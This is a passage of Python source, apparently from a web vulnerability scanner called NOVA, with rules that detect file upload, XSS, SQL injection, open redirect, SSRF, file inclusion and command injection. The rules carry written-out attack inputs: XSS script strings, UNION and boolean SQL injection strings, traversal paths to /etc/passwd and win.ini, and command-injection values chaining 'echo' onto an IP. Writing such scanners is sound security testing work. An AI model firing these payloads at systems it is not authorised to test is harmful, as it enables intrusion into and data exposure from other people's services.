                    "发现文件上传表单；默认未上传测试文件。",
                    payloads=[f"nova-upload-check.txt:{nonce}"],
                    status=STATUS_SUSPECTED,
                    details={
                        "rule_id": self.rule_id,
                        "evidence_type": "upload_form_candidate",
                        "opt_in_required": "NOVA_FILE_UPLOAD_PROBES=true",
                        "target_param": file_field,
                        "nonce": nonce,
                        "confirmation_basis": "默认候选：需要显式开启后上传 harmless 文本文件并确认回显/可访问",
                    },
                )
            ]
        fields = {field.get("name"): str(field.get("value") or "") for field in form.get("inputs", []) if field.get("name") and field.get("type") != "file"}
        response = context.http_client.post_multipart_text_file(
            form.get("action", context.target),
            fields,
            file_field,
            "nova-upload-check.txt",
            nonce,
        )
        if response and nonce in response.get("body", ""):
            return [
                context.finding(
                    context.new_id("UPLOAD"),
                    "确认存在文件上传回显风险",
                    "High",
                    "High",
                    "file_upload",
                    response["url"],
                    f"启用 NOVA_FILE_UPLOAD_PROBES 后，上传 harmless 文本文件内容 {nonce} 在响应中回显。",
                    payloads=[f"nova-upload-check.txt:{nonce}"],
                    status=STATUS_CONFIRMED,
                    request_response=response_evidence(response, matched=nonce),
                    details={
                        "rule_id": self.rule_id,
                        "evidence_type": "upload_nonce_reflection",
                        "enabled_by": "NOVA_FILE_UPLOAD_PROBES",
                        "target_param": file_field,
                        "nonce": nonce,
                        "confirmation_basis": "上传 harmless 文本文件后响应回显唯一 nonce",
                    },
                )
            ]
        return []


class DomXssRule:
    rule_id = "dom_xss"
    phase = "input"

    def evaluate(self, context: RuleContext) -> list[dict]:
        input_point = context.input_point or {}
        page = context.page or {}
        if input_point.get("method", "GET").upper() != "GET":
            return []
        name = str(input_point.get("name") or "")
        if not name:
            return []
        url = str(input_point.get("url") or page.get("final_url") or page.get("url") or "")
        html = str(page.get("html_sample") or page.get("response_summary") or "")
        lowered_context = " ".join([urlparse(url).path.lower(), str(page.get("title") or "").lower(), html.lower()])
        if not looks_like_dom_xss_context(lowered_context):
            return []
        if name.lower() not in lowered_context:
            return []
        if not has_dom_source_to_sink(lowered_context):
            return []

        payload = "English<script>alert('NOVA_DOM_XSS')</script>"
        return [
            context.finding(
                context.new_id("DOMXSS"),
                "确认存在 DOM 型 XSS source-to-sink 风险",
                "High",
                "High",
                "dom_xss",
                url,
                f"页面脚本从 URL 参数 {name} 读取数据，并写入 document.write/HTML sink；该模式可触发 DOM 型 XSS。",
                payloads=[payload],
                status=STATUS_CONFIRMED,
                request_response={
                    "matched": "DOM source-to-sink",
                    "source": "document.location/location.href",
                    "sink": "document.write/HTML sink",
                    "parameter": name,
                },
                details={
                    "rule_id": self.rule_id,
                    "evidence_type": "static_dom_source_sink",
                    "verification_method": "static_dom_source_sink",
                    "source": "URL/location",
                    "sink": "document.write/HTML sink",
                    "target_param": name,
                    "candidate_payload": payload,
                    "confirmation_basis": "页面脚本存在 URL source 到 HTML sink 的直接数据流",
                    "note": "NOVA 未执行浏览器 JavaScript；该结论来自页面脚本中的 DOM source-to-sink 静态证据。",
                },
            )
        ]


class ReflectedXssRule:
    rule_id = "reflected_xss"
    phase = "input"

    def evaluate(self, context: RuleContext) -> list[dict]:
        if not context.settings.active_scan:
            return []
        input_point = context.input_point or {}
        url = str(input_point.get("url") or "")
        param = str(input_point.get("name") or "")
        context_params = input_point.get("form_defaults", {})
        payloads = [
            ("<script>alert('NOVA_XSS')</script>", "script 标签反射"),
            ("\"><svg/onload=alert('NOVA_XSS')>", "HTML 属性逃逸反射"),
        ]
        suspected: dict | None = None
        for payload, purpose in payloads:
            allowed, reason = safe_active_payload(payload)
            if not allowed:
                continue
            response = context.http_client.get(context.http_client.mutate_url(url, param, payload, context_params))
            if not response:
                continue
            if payload in response["body"]:
                reflected_context = reflection_context(response["body"], payload)
                confirmed = is_executable_xss_reflection(response["body"], payload)
                finding = context.finding(
                    context.new_id("P"),
                    "确认存在反射型 XSS" if confirmed else "疑似 XSS 反射点",
                    "High" if confirmed else "Medium",
                    "High" if confirmed else "Medium",
                    "xss",
                    response["url"],
                    (
                        f"参数 {param} 的 XSS payload 在响应中以未编码形式回显，状态码为 {response['status_code']}。"
                        if confirmed
                        else f"参数 {param} 的测试 payload 在响应中被原样反射，状态码为 {response['status_code']}。"
                    ),
                    payloads=[payload],
                    status=STATUS_CONFIRMED if confirmed else STATUS_SUSPECTED,
                    request_response=response_evidence(response, matched=payload),
                    details={
                        "rule_id": self.rule_id,
                        "evidence_type": "active_reflection",
                        "xss_type": "reflected",
                        "target_param": param,
                        "reflection_context": reflected_context,
                        "payload_pattern": purpose,
                        "safety_filter": reason,
                        "confirmation_basis": (
                            "未编码的可执行 XSS payload 在响应中原样回显"
                            if confirmed
                            else "payload 原样回显，但需要人工确认浏览器执行上下文"
                        ),
                    },
                )
                if confirmed:
                    return [finding]
                suspected = suspected or finding
        return [suspected] if suspected else []


class SqliRule:
    rule_id = "sqli"
    phase = "input"

    def evaluate(self, context: RuleContext) -> list[dict]:
        if not context.settings.active_scan:
            return []
        input_point = context.input_point or {}
        url = str(input_point.get("url") or "")
        param = str(input_point.get("name") or "")
        context_params = input_point.get("form_defaults", {})
        baseline = self._safe_get(context, url, param, "1", context_params)
        if not baseline:
            context.probe_failed = True
            return []
        quote_probe = self._safe_get(context, url, param, "1'", context_params)
        if not quote_probe:
            context.probe_failed = True
            return []
        if has_sql_error(quote_probe.get("body", "")):
            followup = self._sqli_error_followup(context, url, param, context_params)
            payloads = ["1'", *followup.get("payloads", [])]
            details = self._sqli_details(quote_probe.get("body", ""), followup)
            evidence = "单引号 payload 触发了数据库错误特征。"
            if followup.get("column_count"):
                evidence += f" ORDER BY 探测推测列数为 {followup['column_count']}。"
            if followup.get("union_marker_reflected"):
                evidence += " UNION SELECT 标记在响应中回显，说明可继续做联合查询型验证。"
            return [
                context.finding(
                    context.new_id("SQLI"),
                    "确认存在 SQL 注入错误回显",
                    "High",
                    "High",
                    "sqli",
                    quote_probe["url"],
                    evidence,
                    payloads=payloads,
                    status=STATUS_CONFIRMED,
                    request_response={
                        "error_probe": response_evidence(quote_probe, matched="SQL error pattern"),
                        "followup": followup,
                        "sqli_details": details,
                    },
                    details=details,
                )
            ]

        payload_pairs = [
            ("1 AND 1=1", "1 AND 1=2"),
            (f"1' AND '1'='1' {SQL_COMMENT_SUFFIX}", f"1' AND '1'='2' {SQL_COMMENT_SUFFIX}"),
            (f"1' AND 1=1 {SQL_COMMENT_SUFFIX}", f"1' AND 1=2 {SQL_COMMENT_SUFFIX}"),
        ]
        for true_payload, false_payload in payload_pairs:
            true_probe = self._safe_get(context, url, param, true_payload, context_params)
            false_probe = self._safe_get(context, url, param, false_payload, context_params)
            if not true_probe or not false_probe:
                context.probe_failed = True
                return []
            true_score = similarity_score(baseline["body"], true_probe["body"])
            false_score = similarity_score(baseline["body"], false_probe["body"])
            if true_score >= 0.90 and false_score <= 0.75 and abs(true_score - false_score) >= 0.20:
                return [
                    context.finding(
                        context.new_id("SQLI"),
                        "确认存在布尔型 SQL 盲注",
                        "High",
                        "High",
                        "sqli_blind",
                        false_probe["url"],
                        f"布尔条件响应存在稳定差异：true 相似度 {true_score:.2f}，false 相似度 {false_score:.2f}。",
                        payloads=[true_payload, false_payload],
                        status=STATUS_CONFIRMED,
                        request_response={
                            "baseline": response_evidence(baseline),
                            "true_case": response_evidence(true_probe, matched=f"similarity={true_score:.2f}"),
                            "false_case": response_evidence(false_probe, matched=f"similarity={false_score:.2f}"),
                        },
                        details={
                            "rule_id": self.rule_id,
                            "evidence_type": "boolean_response_diff",
                            "target_param": param,
                            "verification_method": "baseline_true_false_similarity",
                            "true_similarity": round(true_score, 4),
                            "false_similarity": round(false_score, 4),
                            "confirmation_basis": "基线、true 条件、false 条件响应差异满足布尔盲注阈值",
                            "techniques": ["布尔型 SQL 盲注"],
                        },
                    )
                ]
        return []

    def _safe_get(self, context: RuleContext, url: str, param: str, payload: str, context_params: dict) -> dict | None:
        allowed, _reason = safe_active_payload(payload)
        if not allowed:
            return None
        return context.http_client.get(context.http_client.mutate_url(url, param, payload, context_params))

    def _sqli_error_followup(self, context: RuleContext, url: str, param: str, context_params: dict) -> dict:
        payloads: list[str] = []
        order_by: list[dict] = []
        column_count = 0
        first_error_column = 0

        for column in range(1, 9):
            payload = f"1' ORDER BY {column} {SQL_COMMENT_SUFFIX}"
            response = self._safe_get(context, url, param, payload, context_params)
            if not response:
                break
            payloads.append(payload)
            has_error = has_sql_error(response.get("body", ""))
            order_by.append(
                {
                    "payload": payload,
                    "status_code": response.get("status_code"),
                    "body_length": response.get("body_length"),
                    "sql_error": has_error,
                }
            )
            if has_error:
                first_error_column = column
                break
            column_count = column

        if first_error_column > 1:
            column_count = first_error_column - 1

        union_probe = {}
        union_marker_reflected = False
        if column_count > 0:
            markers = [f"NOVA{index}" for index in range(1, column_count + 1)]
            select_list = ",".join(f"'{marker}'" for marker in markers)
            union_payload = f"-1' UNION SELECT {select_list} {SQL_COMMENT_SUFFIX}"
            response = self._safe_get(context, url, param, union_payload, context_params)
            payloads.append(union_payload)
            if response:
                body = response.get("body", "")
                reflected = [marker for marker in markers if marker in body]
                union_marker_reflected = bool(reflected)
                union_probe = {
                    "payload": union_payload,
                    "status_code": response.get("status_code"),
                    "body_length": response.get("body_length"),
                    "reflected_markers": reflected,
                }

        return {
            "payloads": payloads,
            "order_by": order_by,
            "column_count": column_count,
            "union_probe": union_probe,
            "union_marker_reflected": union_marker_reflected,
            "comment_suffix": SQL_COMMENT_SUFFIX,
            "note": "后续 payload 仅用于授权靶场的错误回显、列数和 UNION 回显点验证。",
        }

    def _sqli_details(self, error_body: str, followup: dict) -> dict:
        column_count = int(followup.get("column_count") or 0)
        reflected = reflected_columns(followup)
        techniques = ["错误回显 SQL 注入"]
        if column_count:
            techniques.append("ORDER BY 列数探测")
        if followup.get("union_marker_reflected"):
            techniques.append("UNION SELECT 回显验证")
        return {
            "rule_id": self.rule_id,
            "evidence_type": "sql_error",
            "dbms_guess": guess_dbms(error_body),
            "injection_context": "单引号字符串闭合",
            "comment_suffix": SQL_COMMENT_SUFFIX,
            "techniques": techniques,
            "column_count": column_count,
            "reflected_columns": reflected,
            "visible_columns": reflected,
            "payload_pattern": sqli_payload_pattern(column_count, reflected),
            "confirmation_basis": "数据库错误特征与后续列数/UNION 探测证据",
            "note": "复制 payload 时需要保留注释后缀，避免原 SQL 继续拼接。",
        }


class OpenRedirectRule:
    rule_id = "open_redirect"
    phase = "input"

    def evaluate(self, context: RuleContext) -> list[dict]:
        if not context.settings.active_scan or not context.settings.open_redirect_probes:
            return []
        input_point = context.input_point or {}
        url = str(input_point.get("url") or "")
        param = str(input_point.get("name") or "")
        if not redirect_param_hint(param):
            return []
        payloads = [
            "https://nova.invalid/redirect-check",
            "//nova.invalid/redirect-check",
            "https://nova.invalid/info.php",
            "//nova.invalid/info.php",
        ]
        response = None
        matched = ""
        location = ""
        payload = ""
        target_host = urlparse(url).netloc.lower()
        for candidate in payloads:
            probe_url = context.http_client.mutate_url(url, param, candidate, input_point.get("form_defaults", {}))
            candidate_response = context.http_client.get_no_redirect(probe_url)
            if not candidate_response:
                continue
            candidate_location = ""
            for key, value in candidate_response.get("headers", {}).items():
                if key.lower() == "location":
                    candidate_location = value
                    break
            final_url = candidate_response.get("url", "")
            location_host = urlparse(candidate_location).netloc.lower()
            final_host = urlparse(final_url).netloc.lower()
            if candidate_response.get("status_code") in {301, 302, 303, 307, 308} and location_host and location_host != target_host:
                response = candidate_response
                matched = candidate_location
                location = candidate_location
                payload = candidate
                break
            if final_host and final_host != target_host and "nova.invalid" in final_host:
                response = candidate_response
                matched = final_url
                location = candidate_location
                payload = candidate
                break
        if not response or not matched:
            return []
        return [
            context.finding(
                context.new_id("REDIR"),
                "确认存在开放重定向",
                "Medium",
                "High",
                "open_redirect",
                response.get("url") or url,
                f"参数 {param} 可控制跳转目标，响应跳转到外部地址：{matched}。",
                payloads=[payload],
                status=STATUS_CONFIRMED,
                request_response={"status_code": response.get("status_code"), "location": location, "matched": matched},
                details={
                    "rule_id": self.rule_id,
                    "evidence_type": "external_redirect",
                    "target_param": param,
                    "confirmation_basis": "跳转 Location 或最终 URL 离开当前同源范围",
                },
            )
        ]


class SsrfCandidateRule:
    rule_id = "ssrf_candidate"
    phase = "input"

    def evaluate(self, context: RuleContext) -> list[dict]:
        input_point = context.input_point or {}
        url = str(input_point.get("url") or "")
        param = str(input_point.get("name") or "")
        if not ssrf_param_hint(param, url):
            return []
        callback = context.settings.ssrf_callback_url
        if not callback:
            return [
                context.finding(
                    context.new_id("SSRF"),
                    "疑似 SSRF URL 输入点",
                    "Medium",
                    "Medium",
                    "ssrf",
                    url,
                    f"参数 {param} 名称/路径表现为服务端取 URL 的候选点；未配置 callback，默认不主动验证。",
                    payloads=["配置 NOVA_SSRF_CALLBACK_URL 后使用专属 callback URL 验证"],
                    status=STATUS_SUSPECTED,
                    details={
                        "rule_id": self.rule_id,
                        "evidence_type": "ssrf_candidate_param",
                        "target_param": param,
                        "opt_in_required": "NOVA_SSRF_CALLBACK_URL",
                        "confirmation_basis": "默认候选：需要 callback 命中或响应回显 callback 标记才能确认",
                    },
                )
            ]
        parsed = urlparse(callback)
        if parsed.scheme not in {"http", "https"} or not parsed.netloc:
            return []
        response = context.http_client.get(context.http_client.mutate_url(url, param, callback, input_point.get("form_defaults", {})))
        if response and callback in response.get("body", ""):
            return [
                context.finding(
                    context.new_id("SSRF"),
                    "确认存在 SSRF 回调 URL 处理风险",
                    "High",
                    "Medium",
                    "ssrf",
                    response["url"],
                    f"配置 NOVA_SSRF_CALLBACK_URL 后，响应中出现 callback 标记：{callback}。",
                    payloads=[callback],
                    status=STATUS_CONFIRMED,
                    request_response=response_evidence(response, matched=callback),
                    details={
                        "rule_id": self.rule_id,
                        "evidence_type": "ssrf_callback_reflection",
                        "target_param": param,
                        "enabled_by": "NOVA_SSRF_CALLBACK_URL",
                        "confirmation_basis": "目标处理了用户提供的 callback URL；若外部 OAST 有命中可进一步确认",
                    },
                )
            ]
        return []


class FileInclusionRule:
    rule_id = "file_inclusion"
    phase = "input"

    def evaluate(self, context: RuleContext) -> list[dict]:
        if not context.settings.active_scan:
            return []
        input_point = context.input_point or {}
        url = str(input_point.get("url") or "")
        param = str(input_point.get("name") or "")
        if not file_param_hint(param, url):
            return []
        context_params = input_point.get("form_defaults", {})
        payloads = [
            "../../../../etc/passwd",
            "../../../../../../etc/passwd",
            "../../../../../../../../etc/passwd",
            "../../../../../../../../../../etc/passwd",
            "../../../../windows/win.ini",
            "../../../../../../windows/win.ini",
            "../../../../../../../../windows/win.ini",
            "..\\..\\..\\..\\windows\\win.ini",
            "..\\..\\..\\..\\..\\..\\windows\\win.ini",
            "..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini",
            "C:/Windows/win.ini",
            "C:\\Windows\\win.ini",
        ]
        for payload in payloads:
            allowed, reason = safe_active_payload(payload)
            if not allowed:
                continue
            response = context.http_client.get(context.http_client.mutate_url(url, param, payload, context_params))
            if not response:
                continue
            signal = lfi_signal(response.get("body", ""))
            if signal:
                category = "lfi" if "passwd" in signal or "win.ini" in signal else "traversal"
                return [
                    context.finding(
                        context.new_id("LFI"),
                        "确认存在本地文件包含/目录穿越",
                        "High",
                        "High",
                        category,
                        response["url"],
                        f"参数 {param} 的路径 payload 触发了只读文件特征：{signal}。",
                        payloads=[payload],
                        status=STATUS_CONFIRMED,
                        request_response=response_evidence(response, matched=signal),
                        details={
                            "rule_id": self.rule_id,
                            "evidence_type": "file_read_signature",
                            "target_param": param,
                            "safety_filter": reason,
                            "confirmation_basis": "响应中出现系统只读文件的稳定特征",
                        },
                    )
                ]
        return []


class CommandInjectionRule:
    rule_id = "command_injection"
    phase = "input"

    def evaluate(self, context: RuleContext) -> list[dict]:
        if not context.settings.active_scan or not context.settings.command_injection_probes:
            return []
        input_point = context.input_point or {}
        url = str(input_point.get("url") or "")
        param = str(input_point.get("name") or "")
        if not command_param_hint(param, url):
            return []
        context_params = input_point.get("form_defaults", {})
        marker = "NOVA_CMD"
        payloads = [f"127.0.0.1; echo {marker}", f"127.0.0.1 && echo {marker}", f"127.0.0.1 | echo {marker}"]
        for payload in payloads:
            allowed, reason = safe_active_payload(payload)
            if not allowed:
                continue
            response = context.http_client.get(context.http_client.mutate_url(url, param, payload, context_params))
            if not response:
                continue
            signal = command_signal(response.get("body", ""), marker=marker)
            if signal:
                return [
                    context.finding(
                        context.new_id("CMD"),
                        "确认存在命令注入",
                        "Critical",
                        "High",
                        "command_injection",
                        response["url"],
                        f"参数 {param} 的非破坏性 echo payload 在响应中回显了唯一标记 {marker}。",
                        payloads=[payload],
                        status=STATUS_CONFIRMED,
                        request_response=response_evidence(response, matched=signal),
                        details={
                            "rule_id": self.rule_id,
                            "evidence_type": "command_echo_marker",
                            "target_param": param,
                            "safety_filter": reason,
                            "confirmation_basis": "响应中出现由 echo 命令产生的唯一标记",
                        },
                    )
                ]
        return []


class PendingInputRule:
    rule_id = "pending_input"
    phase = "input"

    def evaluate(self, context: RuleContext) -> list[dict]:
        input_point = context.input_point or {}
        name = str(input_point.get("name") or "")
        url = str(input_point.get("url") or "")
        return [
            context.finding(
                context.new_id("Q"),
                "URL 参数需要注入风险验证",
                "Low",
                "Medium",
                "injection",
                url,
                f"目标 URL 或 GET 表单中发现参数：{name}。",
                payloads=["'", "' OR '1'='1", "1 AND 1=1", "1 AND 1=2"],
                status=STATUS_PENDING,
                details={"rule_id": self.rule_id, "evidence_type": "input_point", "target_param": name},
            )
        ]


class ActiveProbeLimitRule:
    rule_id = "active_probe_limit"
    phase = "notice"

    def limit_finding(self, context: RuleContext, url: str) -> dict:
        return context.finding(
            context.new_id("Q"),
            "主动探测输入点数量达到上限",
            "Info",
            "High",
            "scanner_limit",
            url,
            f"为避免靶场或本地服务卡死，本次最多主动探测 {context.settings.max_active_inputs} 个输入点，后续输入点已跳过。",
            payloads=[],
            status=STATUS_NOTICE,
            details={"rule_id": self.rule_id, "evidence_type": "scanner_budget"},
        )


class ActiveProbeFailureRule:
    rule_id = "active_probe_failure"
    phase = "notice"

    def failure_finding(self, context: RuleContext, url: str, name: str) -> dict:
        return context.finding(
            context.new_id("Q"),
            "输入点主动探测请求失败或超时",
            "Info",
            "Medium",
            "scanner_limit",
            url,
            f"参数 {name} 的基线或单引号探测请求失败，NOVA 已停止对该输入点继续发送更多 payload，避免扫描长时间卡住。",
            payloads=[],
            status=STATUS_NOTICE,
            details={"rule_id": self.rule_id, "evidence_type": "active_request_failed", "target_param": name},
        )
